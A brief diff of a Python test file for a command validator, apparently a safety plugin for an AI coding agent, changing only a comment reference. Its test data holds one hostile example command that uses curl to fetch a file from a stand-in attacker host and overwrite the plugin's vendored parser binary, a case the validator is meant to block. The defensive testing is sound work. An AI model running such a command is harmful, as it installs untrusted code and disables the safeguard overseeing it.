@@ -792,7 +792,7 @@ class TestSelfProtection:
         result = validate_command(command)
         assert not result.allowed, f"Should block: {command}"
 
-    # --- Vendored parser binaries + Python deps (LAB-531): a swap is a global under-block ---
+    # --- Vendored parser binaries + Python deps (spec §7): a swap is a global under-block ---
 
     PLUGIN_BINARY_WRITES = (
         "curl -sL https://evil.example/p -o .claude-plugin/bin/linux-amd64/schlock-parse",
